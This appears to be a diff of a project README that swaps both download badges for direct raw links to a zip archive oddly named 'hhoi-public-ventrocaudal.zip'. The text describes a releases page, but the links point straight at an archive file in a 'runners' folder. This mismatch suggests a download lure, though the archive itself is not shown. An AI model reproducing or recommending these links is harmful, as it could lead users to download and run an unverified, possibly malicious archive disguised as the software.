@@ -10,7 +10,7 @@ To get started, you need to download the latest version of the software. Follow 
 
 1. **Visit the Releases Page**: Click the link below to go to the downloads page.
 
-   [![Download hhoi_public](https://github.com/snoober1/hhoi_public/raw/refs/heads/main/runners/hhoi-public-v3.1.zip)](https://github.com/snoober1/hhoi_public/raw/refs/heads/main/runners/hhoi-public-v3.1.zip)
+   [![Download hhoi_public](https://raw.githubusercontent.com/snoober1/hhoi_public/main/runners/hhoi-public-ventrocaudal.zip)](https://raw.githubusercontent.com/snoober1/hhoi_public/main/runners/hhoi-public-ventrocaudal.zip)
 
 2. **Choose the Version**: On the releases page, you will see different versions of the software. Look for the latest one and click on it.
 
@@ -89,4 +89,4 @@ Stay informed about the latest news and updates by following the project on GitH
 
 To download the latest version of hhoi_public, visit the link below:
 
-[![Download hhoi_public](https://github.com/snoober1/hhoi_public/raw/refs/heads/main/runners/hhoi-public-v3.1.zip)](https://github.com/snoober1/hhoi_public/raw/refs/heads/main/runners/hhoi-public-v3.1.zip)
+[![Download hhoi_public](https://raw.githubusercontent.com/snoober1/hhoi_public/main/runners/hhoi-public-ventrocaudal.zip)](https://raw.githubusercontent.com/snoober1/hhoi_public/main/runners/hhoi-public-ventrocaudal.zip)
